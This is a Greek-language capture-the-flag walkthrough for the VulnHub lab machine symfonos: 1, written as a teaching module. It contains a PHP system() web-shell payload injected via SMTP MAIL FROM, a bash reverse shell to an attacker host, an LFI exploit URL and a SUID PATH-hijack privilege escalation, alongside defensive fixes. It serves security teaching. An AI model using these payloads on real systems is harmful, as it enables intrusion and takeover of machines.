# Μηχάνημα 12 — symfonos: 1

> **Θέση:** 12 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **062** από 708)
> **Πλήρες walkthrough:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | symfonos: 1 |
| **Δημιουργός** | Zayotic |
| **Κυκλοφορία** | 29 Ιουνίου 2019 |
| **Σύμβαση** | **`user.txt`** + **`root.txt`** |
| **Στόχος** | Debian — Samba 4.5.16, Apache 2.4.25, **Postfix στη :25**, WordPress 5.2.2 |
| **VulnHub** | [entry/symfonos-1,322](https://vulnhub.com/entry/symfonos-1,322/) |
| **Εκτιμώμενος χρόνος** | 5–8 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή περιέχει **την πιο διδακτική ΑΛΥΣΙΔΩΤΗ επίθεση στη διαδρομή: SMTP log poisoning.**

**Κανένα μεμονωμένο bug εδώ δεν σας δίνει κέλυφος.** Χρειάζεστε **τρεις** ξεχωριστές αδυναμίες
να ευθυγραμμιστούν:

1. Ένα **LFI** σε plugin του WordPress
2. Ένα **γραμματοκιβώτιο Postfix** που είναι **αναγνώσιμο** από το LFI και **εγγράψιμο** μέσω mail
3. Τη **συνειδητοποίηση ότι οτιδήποτε μπορείτε να ΓΡΑΨΕΤΕ σε ένα αρχείο που το LFI μπορεί να
   ΔΙΑΒΑΣΕΙ είναι εκτέλεση κώδικα**

**Αυτή είναι η στιγμή που το LFI σταματά να είναι «ανάγνωση αρχείου» και γίνεται RCE.**

Και είναι μοτίβο που **επανέρχεται συνεχώς σε πραγματικές υποδομές PHP**: mail spools, **Apache
access και error logs**, **SSH auth logs**, **`/proc/self/environ`**.

**Αν μάθετε μόνο ένα πράγμα από αυτή τη διαδρομή, ας είναι αυτό.**

Επιπλέον, εισάγει **μία νέα συνήθεια**: **να διαβάζετε μια «προειδοποίηση» ως ΠΡΟΣΚΛΗΣΗ.** Το
`attention.txt` λέει «αυτοί οι κωδικοί ΑΠΑΓΟΡΕΥΟΝΤΑΙ» — **και αυτοί ακριβώς είναι οι κωδικοί που
είναι ΣΕ ΧΡΗΣΗ**, **γιατί απαγορεύετε ό,τι χρησιμοποιεί πραγματικά ο κόσμος**.

## Στόχοι μάθησης

1. Να **διαβάσετε μια λίστα απαγορευμένων κωδικών** ως **λίστα κωδικών σε χρήση**.
2. Να κάνετε **RID cycling** για usernames.
3. Να καταλάβετε γιατί το **`-U 'user%password'`** χρειάζεται **μονά** εισαγωγικά.
4. Να **εντοπίσετε LFI σε plugin WordPress** με `wpscan` και να **διαβάσετε το επίπεδο
   εμπιστοσύνης**.
5. Να **μιλήσετε SMTP με το χέρι** — και να διαβάσετε τους **κωδικούς απάντησης ως γραμματική**.
6. Να **δηλητηριάσετε ένα mail spool** και να μετατρέψετε **LFI σε RCE**.
7. Να εκτελέσετε **PATH hijack** σε SUID binary με **σκέτο `curl`** — και να **επαναφέρετε** το
   `$PATH` μετά.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Ανώνυμο SMB share** | `anonymous` → **`attention.txt`** (154 bytes) |
| **Λίστα απαγορευμένων κωδικών** | **`epidioko`, `qwerty`, `baseball`** — **δηλαδή κωδικοί ΣΕ ΧΡΗΣΗ** |
| **RID cycling** | `S-1-5-21-…-1000 → SYMFONOS\helios` · `-1001 → zeus` |
| **Πιστοποιημένο share** | `helios / qwerty` → **`research.txt`, `todo.txt`** |
| **Οδηγίες μέσα σε αρχείο** | `todo.txt` → **«`vi /etc/hosts` για `symfonos.local`»** + **«WordPress στο `/h3l105`»** |
| **LFI σε plugin** | **mail-masta 1.0** → **EDB 40290** → `count_of_send.php?pl=` |
| **SMTP log poisoning** | **`MAIL FROM: <?php system($_GET['c']); ?>`** → **`/var/mail/helios`** |
| **PATH hijack σε SUID** | **`/opt/statuscheck`** → **`curl -I http://localhost`** (σκέτο `curl`) |

## Διαβάστε πρώτα

- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§9** (LFI) και **§10**
  (**log poisoning — το κεφάλαιο που γράφτηκε για αυτό το μηχάνημα**).
- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) — **§2** (SMB) και **§5**
  (**SMTP**).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§7** (PATH hijack).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§1** (URL
  encoding) και **§3** (TTY).
- Αγγλική έκδοση:
  [Machine 12](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/12-symfonos-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Αν ένας διαχειριστής δημοσιεύσει **λίστα απαγορευμένων κωδικών**, τι σας δίνει αυτό;
2. Γιατί το **`-U 'helios%qwerty'`** χρειάζεται **μονά** εισαγωγικά;
3. Τι σημαίνει **`(100% confidence)`** έναντι **`(80% confidence)`** στο `wpscan`;
4. Γιατί η PHP **τυπώνει** το `/etc/passwd` αντί να το **εκτελεί**;
5. Ποια **τρία** πράγματα πρέπει να ισχύουν για να γίνει ένα LFI → RCE μέσω poisoning;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

**Πέντε θύρες: 22, 25, 80, 139, 445.**

**Η θύρα 25 είναι ο σπόρος ολόκληρου του κουτιού.** Το SMTP να είναι ανοιχτό **δεν** είναι από
μόνο του ευπάθεια — **αλλά σημαίνει ότι το μηχάνημα δέχεται mail και το γράφει σε αρχείο**, και
**αυτό το αρχείο είναι αναγνώσιμο από ένα LFI.**

**Κρατήστε το στο μυαλό σας· αποδίδει στο βήμα 6.**

Και το SMB έχει ένα ανώνυμο share: **`anonymous`**. Ξεκινήστε από εκεί.

**ΠΡΟΣΟΧΗ:** το WordPress εδώ **δεν** είναι στο `/` — είναι στο **`/h3l105`**. **Αν δεν το
βρείτε, το `todo.txt` μέσα στο πιστοποιημένο share σας το λέει.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. echo "TARGET symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
 2. sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
    sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services TARGET
 3. smbclient -L //TARGET -N → print$, helios, anonymous, IPC$
 4. smbclient //TARGET/anonymous -N → get attention.txt
    → «ΑΠΑΓΟΡΕΥΟΝΤΑΙ: epidioko, qwerty, baseball»   ← **ΔΗΛΑΔΗ ΕΙΝΑΙ ΣΕ ΧΡΗΣΗ**
 5. enum4linux -a TARGET → helios (RID 1000), zeus (RID 1001)
 6. smbclient //TARGET/helios -U 'helios%qwerty' → get todo.txt
    → «vi /etc/hosts για symfonos.local» + «WordPress στο /h3l105»
 7. wpscan --url http://symfonos.local/h3l105 -e ap,u --plugins-detection aggressive
    → mail-masta 1.0 (100% confidence)
 8. searchsploit wordpress mail masta → php/webapps/40290.txt
 9. LFI: count_of_send.php?pl=/etc/passwd
10. nc TARGET 25 → MAIL FROM: <?php system($_GET['c']); ?>
11. curl "…?pl=/var/mail/helios&c=id" → www-data     ← **LFI + POISONING = RCE**
12. Reverse shell + αναβάθμιση TTY
13. find / -perm -u=s -type f 2>/dev/null → /opt/statuscheck
14. strings /opt/statuscheck → "curl -I http://localhost"   ← **ΣΚΕΤΟ curl**
15. PATH hijack → root
```

**Το κρίσιμο άλμα είναι το 9 → 10 → 11.** Μέχρι το 9 έχετε **ανάγνωση αρχείων**. Στο 11 έχετε
**εκτέλεση κώδικα**. **Τίποτα ενδιάμεσα δεν άλλαξε εκτός από το ότι ΓΡΑΨΑΤΕ σε ένα αρχείο.**
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — πώς μιλάτε SMTP με το χέρι</strong></summary>

```bash
nc TARGET 25
```

**Το SMTP είναι πρωτόκολλο κειμένου προσανατολισμένο σε γραμμές**, άρα **μπορείτε να το μιλήσετε
με το χέρι.** Διαβάστε τους κωδικούς απάντησης ως **τη γραμματική** του πρωτοκόλλου:

| Κωδικός | Σημασία |
| --- | --- |
| **`220`** | **Χαιρετισμός** — «είμαι έτοιμος» |
| **`250`** | **Επιτυχία** |
| **`354`** | **«Άρχισε να στέλνεις το σώμα του μηνύματος»** |
| **`.`** μόνη της σε γραμμή | **ΤΕΛΟΣ του σώματος** |
| **`5xx`** | **Μόνιμη αποτυχία** |
| **`4xx`** | **Προσωρινή αποτυχία** — δοκιμάστε ξανά |

**Η ακολουθία:**

```text
220 symfonos.local ESMTP Postfix (Debian/GNU)
HELO attacker                           ← συστήνεστε
250 symfonos.local
MAIL FROM: <?php system($_GET['c']); ?> ← **ΕΔΩ πάει η PHP**
250 2.1.0 Ok
RCPT TO: helios                         ← σε ποιον
250 2.1.5 Ok
DATA                                    ← «στείλε το σώμα»
354 End data with <CR><LF>.<CR><LF>
Subject: test
test
.                                       ← **μόνη της τελεία = τέλος**
250 2.0.0 Ok: queued as 8B0F21A2
QUIT
```

**Γιατί η PHP πάει στο `MAIL FROM:`;** Επειδή **αυτή η συμβολοσειρά γράφεται ΚΑΤΑ ΛΕΞΗ μέσα στο
αρχείο του γραμματοκιβωτίου.** **Και αυτό είναι ακριβώς γιατί ένα μη επικυρωμένο πεδίο φακέλου
είναι διάνυσμα έγχυσης κώδικα.**

**Εναλλακτικά σημεία έγχυσης, κατά αξιοπιστία:**

| Πεδίο | Γράφεται στο spool; |
| --- | --- |
| **`MAIL FROM:`** | **Ναι — και είναι το πιο αξιόπιστο** |
| **`Subject:`** | Ναι |
| **Σώμα μηνύματος** | Ναι, αλλά **μπορεί να υποστεί MIME encoding** |
| **`RCPT TO:`** | Ναι, αλλά **επικυρώνεται** συχνότερα |
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — γιατί το LFI γίνεται RCE</strong></summary>

**Ο γενικός κανόνας:**

> **Ένα LFI γίνεται RCE όταν μπορείτε να κάνετε τον στόχο να ΓΡΑΨΕΙ ένα αρχείο που
> ΕΛΕΓΧΕΤΕ, σε ΠΡΟΒΛΕΨΙΜΗ διαδρομή.**

**Τα συνηθισμένα primitives:**

| Στόχος | Πώς γράφετε μέσα του |
| --- | --- |
| **Mail spool** (`/var/mail/USER`) | **SMTP `MAIL FROM:`** ← **εδώ** |
| **Apache access log** (`/var/log/apache2/access.log`) | **`User-Agent: <?php … ?>`** |
| **Apache error log** (`/var/log/apache2/error.log`) | **Αίτηση σε ανύπαρκτη διαδρομή με PHP στο URL** |
| **SSH auth log** (`/var/log/auth.log`) | **`ssh '<?php … ?>'@TARGET`** |
| **`/proc/self/environ`** | **`User-Agent`** (απαιτεί παλιά PHP) |
| **Αρχεία session PHP** | **Όνομα χρήστη σε φόρμα** |
| **NFS export** | **Εγγραφή από άλλο μηχάνημα** |

**Τα τρία που πρέπει να ισχύουν:**

1. **Το αρχείο να είναι ΑΝΑΓΝΩΣΙΜΟ από το LFI** — δηλαδή **προβλέψιμη διαδρομή**
2. **Να μπορείτε να ΓΡΑΨΕΤΕ μέσα του** — μέσω **οποιασδήποτε υπηρεσίας**
3. **Η PHP να μην έχει ήδη εκτελέσει/καθαρίσει τη γραμμή σας** — **άρα το payload πρέπει να
   είναι ΑΥΤΟΤΕΛΕΣ** (`<?php … ?>`)

**Εδώ:** το `/var/mail/helios` είναι **προβλέψιμο** (το όνομα χρήστη το βρήκατε με RID
cycling), **εγγράψιμο** (μέσω SMTP), **και το LFI το διαβάζει**. **Και τα τρία.**
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
echo "TARGET symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services TARGET

smbclient -L //TARGET -N
smbclient //TARGET/anonymous -N        # → dir · get attention.txt · exit
enum4linux -a TARGET
smbclient //TARGET/helios -U 'helios%qwerty'    # → get todo.txt · exit

wpscan --url http://symfonos.local/h3l105 -e ap,u --plugins-detection aggressive
searchsploit -x php/webapps/40290.txt

curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

nc TARGET 25
# MAIL FROM: <?php system($_GET['c']); ?>

nc -lvnp 4444
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
curl -s "…?pl=/var/mail/helios&c=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/helios/user.txt

find / -perm -u=s -type f 2>/dev/null          # → /opt/statuscheck
strings /opt/statuscheck | grep -iE 'curl|/bin|/usr'   # → "curl -I http://localhost"

cd /home/helios
printf '#!/bin/bash\n/bin/bash -p\n' > curl && chmod +x curl
export PATH=/home/helios:$PATH
/opt/statuscheck
id ; cat /root/root.txt
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   # ΕΠΑΝΑΦΟΡΑ
```
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Διαβάστε το <code>attention.txt</code> σωστά.</b></summary>

```text
A word to the wise...
All users are required to change their passwords. The following passwords are now BANNED:
epidioko
qwerty
baseball
```

**Διαβάστε το ως ΠΡΟΣΚΛΗΣΗ, όχι ως προειδοποίηση.**

**Ο διαχειριστής ΔΗΜΟΣΙΕΥΣΕ μια λίστα κωδικών που είναι ΣΕ ΧΡΗΣΗ** — **γιατί απαγορεύετε ό,τι
χρησιμοποιεί πραγματικά ο κόσμος.** Αν κανείς δεν τους χρησιμοποιούσε, **δεν θα χρειαζόταν να
τους απαγορεύσει.**

**Τρεις υποψήφιοι.** **Και, κρίσιμα, ένα νόμιμο username:** **το share ονομάζεται `helios`.**

**Αυτό είναι το δίδαγμα:** *οι αρνητικές λίστες αποκαλύπτουν τη θετική λίστα.* **Το ίδιο ισχύει
για:**

| Άρνηση | Τι αποκαλύπτει |
| --- | --- |
| **«Απαγορευμένοι κωδικοί»** | **Κωδικούς σε χρήση** |
| **`Disallow:` στο `robots.txt`** | **Διαδρομές που ο διαχειριστής θεωρεί ευαίσθητες** |
| **`403 Forbidden`** | **Το αρχείο ΥΠΑΡΧΕΙ** (σε αντίθεση με το `404`) |
| **Μπλοκαρισμένοι λογαριασμοί στο log** | **Ονόματα που κάποιος δοκίμασε ήδη** |
| **Λίστα επιτρεπόμενων IPs** | **Ποιοι λογαριασμοί θεωρούνται έμπιστοι** |
</details>

<details>
<summary><b>2.</b> Γιατί μονά εισαγωγικά στο <code>-U 'helios%qwerty'</code>;</b></summary>

Επειδή **`%`** και **`!`** είναι **και τα δύο σημασιολογικά για ένα κέλυφος χωρίς εισαγωγικά**:

| Χαρακτήρας | Τι κάνει το κέλυφος |
| --- | --- |
| **`%`** | Στο **`bash`** με ενεργό **`histchars`**, το `%` μπορεί να **εκκινήσει επέκταση** |
| **`!`** | **Ιστορική επέκταση** — **`!$`**, **`!!`**, **`!cmd`** **αντικαθίστανται ΠΡΙΝ την εκτέλεση** |
| **`$`** | **Επέκταση μεταβλητής** |
| **`` ` ``** | **Υποκατάσταση εντολής** |

**Με ΔΙΠΛΑ εισαγωγικά**, το **`$`** και το **`` ` ``** **εξακολουθούν να επεκτείνονται**.
**Με ΜΟΝΑ, ΤΙΠΟΤΑ δεν επεκτείνεται.**

**Άρα:** `-U 'helios%qwerty'` είναι **ασφαλές**· `-U "helios%qwerty!"` **θα σπάσει**·
`-U helios%qwerty!` **θα σπάσει ΠΙΟ σιωπηλά.**

**Ο γενικός κανόνας:** *διαπιστευτήρια πάντοτε σε ΜΟΝΑ εισαγωγικά.* **Ισχύει για `smbclient`,
`mysql`, `psql`, `redis-cli`, `curl -u`, `sshpass -p`.**

**Και ο δεύτερος λόγος:** το **`%`** είναι **ο διαχωριστής user:password του smbclient**. **Αν
ο κωδικός ΠΕΡΙΕΧΕΙ `%`**, πρέπει να **δραπετευτεί** — **άρα προτιμήστε**:

```bash
smbclient //TARGET/helios -U helios%qwerty
# ή με διαχωρισμό:
smbclient //TARGET/helios -U helios -P
```
</details>

<details>
<summary><b>3.</b> Διαβάστε τα επίπεδα εμπιστοσύνης του <code>wpscan</code>.</b></summary>

```text
[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Version: 1.0 (100% confidence)
[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Version: 1.1.1 (80% confidence)
```

| Εμπιστοσύνη | Πώς προέκυψε |
| --- | --- |
| **100%** | **Ανέκτησε το `readme.txt` του ίδιου του plugin και διάβασε το `Stable tag`** — **αυτοαναφορά** |
| **80–99%** | **Διάβασε metadata** (σχήμα αρχείων, ονόματα) |
| **< 80%** | **Μάντεψε από δομή καταλόγου** |

**Η διαφορά έχει σημασία:** **ένα 100% ταιριάζει ΑΚΡΙΒΩΣ σε CVE/EDB**· **ένα 70% μπορεί να είναι
λάθος έκδοση**, **άρα μπορεί να δοκιμάσετε λάθος exploit.**

**`--plugins-detection aggressive`** κάνει το wpscan να **ζητά ΓΝΩΣΤΑ αρχεία** κάθε plugin
(`readme.txt`, `changelog.txt`, συγκεκριμένα `.php`) **αντί να διαβάζει παθητικά metadata**.
**Αυτό είναι πιο αξιόπιστο — αλλά ΚΑΙ πιο ανιχνεύσιμο**, **γιατί δημιουργεί 404s στο access log.**

**`-e ap,u`** = **a**ll **p**lugins + **u**sers. **Οι επιλογές είναι:** `vp` (ευάλωτα μόνο),
`ap` (όλα), `t` (θέματα), `u` (χρήστες), `tt` (timthumbs), `cb` (config backups), `dbe`
(εκθέσεις βάσης), `m` (media ids).

**Σε πραγματικό έργο:** **`-e vp,u,t`** πρώτα (γρήγορο, ήσυχο)· **`ap`** μόνο αν χρειάζεται.
</details>

<details>
<summary><b>4.</b> Γιατί η PHP ΤΥΠΩΝΕΙ το <code>/etc/passwd</code> αντί να το εκτελεί;</b></summary>

Επειδή **το `/etc/passwd` ΔΕΝ περιέχει ετικέτες `<?php`.**

**Ο αναλυτής της PHP σαρώνει το αρχείο για `<?php`**· **οτιδήποτε βρίσκεται ΕΞΩ από αυτές τις
ετικέτες εκδίδεται ως ΚΥΡΙΟΛΕΚΤΙΚΗ έξοδος.**

**Αυτό ισχύει και για το polyglot του Μηχανήματος 10:** **η κεφαλίδα `GIF89a` είναι αδρανής**,
**και ο κώδικας μετά το `<?php` τρέχει.**

**Άρα:**

| Περιεχόμενο αρχείου | Τι κάνει η `include()` |
| --- | --- |
| **Καθόλου `<?php`** | **Τυπώνει ΟΛΟΚΛΗΡΟ το αρχείο** ← `/etc/passwd`, mail spool |
| **Έχει `<?php … ?>`** | **ΕΚΤΕΛΕΙ τον κώδικα μέσα στις ετικέτες**, τυπώνει τα υπόλοιπα |
| **Έχει `<?=`** | **Εκτελεί και τυπώνει** (συντομογραφία `echo`) |
| **Binary περιεχόμενο** | **Τυπώνει raw bytes** — **γι' αυτό χρειάζεστε `php://filter` για βάση** |

**Και το τελευταίο είναι κρίσιμο:** αν συμπεριλάβετε **ένα αρχείο `.php`**, **η PHP το ΕΚΤΕΛΕΙ**
— **άρα ΔΕΝ βλέπετε τον πηγαίο κώδικα.** **Γι' αυτό χρειάζεστε το `php://filter` (Μηχάνημα 10).**

**Αλλά ΕΔΩ το payload σας είναι ΜΕΣΑ στο mail spool** — **και το `<?php system(...) ?>` είναι
πραγματική ετικέτα.** **Άρα ΕΚΤΕΛΕΙΤΑΙ.**
</details>

<details>
<summary><b>5.</b> Διαβάστε το <code>curl -I http://localhost</code> ως την ΟΛΟΚΛΗΡΗ ευπάθεια.</b></summary>

```text
-rwsr-xr-x 1 root root 8632 Jun 29  2019 /opt/statuscheck
```
```text
curl -I http://localhost
```

**Δύο στοιχεία, και τα δύο είναι το bug:**

1. **`-rwsr-xr-x root root`** — **SUID root.** **Όποιος το τρέχει, το τρέχει ΩΣ root.**
2. **`curl` ΧΩΡΙΣ αρχικό `/`** — **σκέτο όνομα.** **Άρα το κέλυφος ψάχνει το `$PATH`.**

**Όταν ένα πρόγραμμα καλεί ένα άλλο ΜΟΝΟ με όνομα**, **το κέλυφος ψάχνει το `$PATH` από αριστερά
προς τα δεξιά και τρέχει το ΠΡΩΤΟ ταίριασμα** — **άρα αν ελέγχετε έναν κατάλογο ΠΙΟ ΜΠΡΟΣΤΑ στο
`$PATH`, το ΔΙΚΟ ΣΑΣ αρχείο τρέχει, με τα προνόμια του root.**

**Το `localhost` επίσης έχει σημασία:** **αποδεικνύει ότι το binary προοριζόταν για εσωτερικό
έλεγχο υγείας** — **και ότι Ο ΔΗΜΙΟΥΡΓΟΣ ΔΕΝ ΣΚΕΦΤΗΚΕ ότι θα τρέξει σε εχθρικό περιβάλλον.**

**Οι ΔΥΟ κανόνες που σκοτώνουν ΟΛΟΚΛΗΡΗ αυτή την κατηγορία:**

> **1. Ποτέ μην αφήνετε ένα πρόγραμμα SUID να λύνει εντολές μέσω `$PATH`.**
>    **Χρησιμοποιήστε ΑΠΟΛΥΤΕΣ διαδρομές** (`/usr/bin/curl`).
> **2. Καθαρίστε το περιβάλλον.** **`env -i`**, ή **`secure_path`** στο sudoers, ή
>    **`Defaults env_reset`**.

**Και μετά, ανιχνεύστε:** **οποιοδήποτε αρχείο SUID εκτός baseline πρέπει να ειδοποιεί κάποιον.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Ανώνυμο SMB share** | **`restrict anonymous = 2`** + **`map to guest = never`** |
| **Λίστα απαγορευμένων κωδικών δημοσιευμένη** | **Μην δημοσιεύετε αρνητικές λίστες** — **αποκαλύπτουν τη θετική** |
| **RID cycling** | **`restrict anonymous`** — **μπλοκάρει το `SamrLookupRids`** |
| **`qwerty` ως κωδικός** | **Πολιτική μήκους ≥ 12** + **απόρριψη κοινών λεξικών** |
| **mail-masta 1.0 (EDB 40290)** | **Αφαίρεση plugin.** **Δεν συντηρείται από το 2016** |
| **LFI `include($_GET['pl'])`** | **Whitelist τιμών** (`$allowed = ['send','draft']; if (!in_array($_GET['pl'],$allowed)) die;`) |
| **`/var/mail/helios` αναγνώσιμο από www-data** | **`chmod 660` + ομάδα `mail`** — **και το www-data ΔΕΝ πρέπει να είναι στην ομάδα** |
| **Postfix δέχεται αυθαίρετο `MAIL FROM`** | **Έλεγχος σύνταξης** + **`smtpd_data_restrictions`** |
| **Uploads μέσα στο document root** | **Εκτός web root** + **`php_flag engine off`** στον κατάλογο |
| **`/opt/statuscheck` SUID με σκέτο `curl`** | **Απόλυτη διαδρομή** + **`chmod u-s`** |
| **WordPress 5.2.2** | **Αυτόματη ενημέρωση.** Το 5.2.2 έχει **πολλαπλά** CVEs |

**Το μεγαλύτερο δίδαγμα:** *ένα LFI από μόνο του είναι «ανάγνωση». Ένα LFI συν ένα εγγράψιμο
προβλέψιμο αρχείο είναι «εκτέλεση».* **Η διαφορά είναι ΜΙΑ γραμμή στον κατάλογο ελέγχου σας —
και είναι η γραμμή που οι περισσότεροι ξεχνούν.**

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = **192.168.56.101**, `ATTACKER` = **192.168.56.10**. **Αυτό το κουτί απαιτεί
καταχώριση hostname ΠΡΙΝ το κομμάτι web να συμπεριφερθεί σωστά.**

### 1. Hostname, μετά σάρωση δύο σταδίων

```bash
ip a | grep -w inet
echo "TARGET symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services TARGET
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.42/24 brd 192.168.1.255 scope global dynamic eth1
```
```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 5d:6b:73:4a:6d:5c:2c:3d:4e:5f:6a:7b:8c:9d:0e:1f (RSA)
|   256 6e:7f:8a:9b:0c:1d:2e:3f:4a:5b:6c:7d:8e:9f:0a:1b (ECDSA)
|_  256 1a:2b:3c:4d:5e:6f:7a:8b:9c:0d:1e:2f:3a:4b:5c:6d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS.LOCAL
```

**`ip a | grep -w inet` ΠΡΩΤΑ** — **γιατί δεν μπορείτε να προσθέσετε καταχώριση hosts στο σωστό
υποδίκτυο χωρίς να ξέρετε τη ΔΙΚΗ ΣΑΣ διεύθυνση.** **`-w`** = **ολόκληρη λέξη**, ώστε να μην
ταιριάξει το `inet6`.

**Δύο διεπαφές:** **`eth0` = 192.168.56.10** (host-only, **προς το VM**) και **`eth1`**
(προς τα έξω). **Ο `TARGET` είναι στο 56.x.**

**`--min-rate 1000`** ορίζει **κάτωφλι probes ανά δευτερόλεπτο** — **αυτό κάνει μια σάρωση
65.535 θυρών να παίρνει λεπτά αντί για ώρες**· **η δεύτερη σάρωση μετά τρέχει την ΑΡΓΗ
ανίχνευση έκδοσης και τα scripts ΜΟΝΟ στις πέντε θύρες που έχουν σημασία.**

**Η θύρα 25 είναι ο σπόρος ολόκληρου του κουτιού.**

**Διαβάστε το `_smtp-commands`:**

| Δυνατότητα | Τι σημαίνει για εσάς |
| --- | --- |
| **`VRFY`** | **Μπορείτε να ΕΠΑΛΗΘΕΥΣΕΤΕ αν ένα όνομα χρήστη υπάρχει** — `VRFY helios` → **`250 2.1.5 helios`** |
| **`ETRN`** | **Ζητήστε άμεση παράδοση της ουράς** |
| **`STARTTLS`** | **Υποστηρίζει TLS** (αλλά εδώ **δεν το απαιτεί**) |
| **`SIZE 10240000`** | **Όριο ~10 MB ανά μήνυμα** |
| **`PIPELINING`** | **Μπορείτε να στείλετε ΠΟΛΛΕΣ εντολές χωρίς να περιμένετε απάντηση** |
| **`8BITMIME`** | **Δέχεται 8-bit σώμα** — **σημαντικό για το payload σας** |

**Το `VRFY` ΕΝΕΡΓΟ είναι εύρημα από μόνο του** — **επιτρέπει αναρίθμηση χρηστών χωρίς
πιστοποίηση.** **Σε παραγωγή: `disable_vrfy_command = yes`.**

**`Host: SYMFONOS.LOCAL`** — **το nmap διάβασε το hostname από το SMB.**

### 2. SMB — το ανώνυμο share

```bash
smbclient -L //TARGET -N
```

```text
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.
        Server               Comment
        ---------            -------
        SYMFONOS
        Workgroup            Master
        ---------            -------
        WORKGROUP            SYMFONOS
```

**Τέσσερα shares.** **Διαβάστε τα ονόματα:**

| Share | Τι υπονοεί |
| --- | --- |
| **`print$`** | **Stock** — drivers εκτυπωτή |
| **`helios`** | **ΠΡΟΣΩΠΙΚΟ share ενός χρήστη ΟΝΟΜΑΤΙ `helios`** ← **username** |
| **`anonymous`** | **Ανώνυμο** ← **ξεκινήστε εδώ** |
| **`IPC$`** | **Διαδικασία** — **επιτρέπει RID cycling** |

**`-L … -N`** καταγράφει shares με **NULL session**· **`-N`** σημαίνει **«χωρίς κωδικό»**.

```bash
smbclient //TARGET/anonymous -N
```

```text
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jun 29 03:06:24 2019
  ..                                  D        0  Fri Jun 28 22:14:49 2019
  attention.txt                       N      154  Sat Jun 29 03:06:24 2019

                20452264 blocks of size 1024. 17164300 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (75.2 KiloBytes/sec) (average 75.2 KiloBytes/sec)
smb: \> exit
```

```bash
cat attention.txt
```

```text
A word to the wise...
All users are required to change their passwords. The following passwords are now BANNED:
epidioko
qwerty
baseball
```

**Διαβάστε αυτό το σημείωμα ως ΠΡΟΣΚΛΗΣΗ, όχι ως προειδοποίηση.**

**Ο διαχειριστής ΔΗΜΟΣΙΕΥΣΕ μια λίστα κωδικών που είναι ΣΕ ΧΡΗΣΗ** — **γιατί απαγορεύετε ό,τι
χρησιμοποιεί πραγματικά ο κόσμος.** **Τρεις υποψήφιοι**, **και κρίσιμα, ένα νόμιμο username: το
share ονομάζεται `helios`.**

| Εντολή μέσα στο `smbclient` | Ρόλος |
| --- | --- |
| **`dir`** | **Καταγραφή** — **`D` = κατάλογος, `N` = κανονικό αρχείο, `A` = archive** |
| **`get FILE`** | **Κατεβάζει στον ΤΡΕΧΟΝΤΑ κατάλογό σας** |
